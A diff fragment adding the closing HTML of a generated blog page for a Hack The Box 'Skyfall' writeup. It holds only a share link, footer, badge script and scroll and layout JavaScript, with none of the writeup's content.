+    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/HTB/Skyfall.html&text=Writeup+for+HTB Skyfall writeup+from+HTB+held+on+2024-09-02 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('hide');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
